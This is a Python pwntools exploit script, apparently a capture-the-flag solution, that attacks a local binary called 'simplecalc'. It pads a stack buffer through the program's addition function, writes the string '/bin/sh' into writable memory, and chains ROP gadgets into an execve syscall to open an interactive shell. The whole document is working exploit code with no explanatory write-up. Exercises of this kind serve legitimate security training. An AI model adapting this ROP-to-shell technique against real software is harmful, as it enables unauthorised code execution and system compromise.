from pwn import *

elf = ELF("simplecalc")
script = '''
	break * 0x000000000040154a
	break * 0x0000000000401545
'''
p = process(elf.path)
# gdb = gdb.attach(p, gdbscript=script)

# First arguments
p.recvuntil("calculations: ")
p.sendline("100")


# Padding between variable input and RET == 0x48 | 72
# Pwndbg> x/gx 0x7fffffffde38 - 0x7fffffffddf0
# 0x48:	Cannot access memory at address 0x48


def send(x):
    p.recvuntil("=> ")
    p.sendline("1")
    p.recvuntil("Integer x: ")
    p.sendline("100")
    p.recvuntil("Integer y: ")
    p.sendline(str(x - 100))

def convert(z):
    x = z & 0xffffffff
    y = ((z & 0xffffffff00000000) >> 32)
    send(x)
    send(y)
    print(hex(x))
    print(hex(y))

# Fill spacebetween input and ret to arrive in ret
for i in range(9):
    convert(0x0)

# mov [rdi], rdx; ret
mov_rdi_rdx = 0x0000000000400aba
pop_rdi     = 0x0000000000401b73
pop_rdx     = 0x0000000000437a85
pop_rsi     = 0x0000000000401c87
pop_rax     = 0x000000000044db34
syscall     = 0x0000000000400488
rw_mem      = 0x6c0000

convert(pop_rdi)
convert(rw_mem)
convert(pop_rdx)
convert(0x0068732f6e69622f)
convert(mov_rdi_rdx)

# EXECVE CHAIN

convert(pop_rax)
convert(0x3b)
convert(pop_rdi)
convert(rw_mem)
convert(pop_rsi)
convert(0x0)
convert(pop_rdx)
convert(0x0)
convert(syscall)

p.interactive()